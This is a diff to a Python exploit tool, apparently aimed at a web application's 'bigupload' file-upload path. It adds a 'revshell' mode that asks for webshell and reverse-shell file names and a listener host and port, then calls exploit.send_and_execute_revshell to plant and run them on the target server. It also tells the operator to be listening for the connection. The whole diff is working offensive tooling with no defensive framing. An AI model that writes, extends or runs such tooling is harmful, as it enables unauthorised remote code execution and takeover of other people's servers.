@@ -22,8 +22,47 @@ def webshell_action() -> None:
         print('[-] Something went wrong [-]')
         print(f'\nUnable to determine whether the file upload was successful. You can check at {url}/main/inc/lib/javascript/bigupload/files/')
 
+
+def revshell_action() -> None:
+    system('clear')
+
+    webshell_filename = input('Enter the name of the webshell file that will be placed on the target server (default: webshell.php): ')
+    bash_revshell_filename = input('Enter the name of the bash revshell file that will be placed on the target server (default: revshell.sh): ')
+    host = input('Enter the host the target server will connect to when the revshell is run: ')
+    port = input('Enter the port on the host the target server will connect to when the revshell is run: ')
+
+    if not host or not port:
+        print('\n[-] You need to provied a valid host and port for the target server to connect to [-]')
+        exit(1)
+    
+    try:
+        int(port)
+    except ValueError:
+        print('\n[-] You need to provied a valid host and port for the target server to connect to [-]')
+        exit(1)
+
+    if not webshell_filename:
+        webshell_filename = 'webshell.php'
+
+    if not bash_revshell_filename:
+        bash_revshell_filename = 'revshell.sh'
+
+    system('clear')
+
+    print('[!] BE SURE TO BE LISTENING ON THE PORT THAT YOU DEFINED [!]\n')
+
+    result = exploit.send_and_execute_revshell(webshell_filename, bash_revshell_filename, host, port)
+
+    if result:
+        print('[+] Execution completed [+]')
+        print('\nYou should already have a revserse connection by now.')
+    else:
+        print('[-] Something went wrong [-]')
+
+
 actions = {
-    'webshell': webshell_action
+    'webshell': webshell_action,
+    'revshell': revshell_action
 }
 
 parser = ArgumentParser(
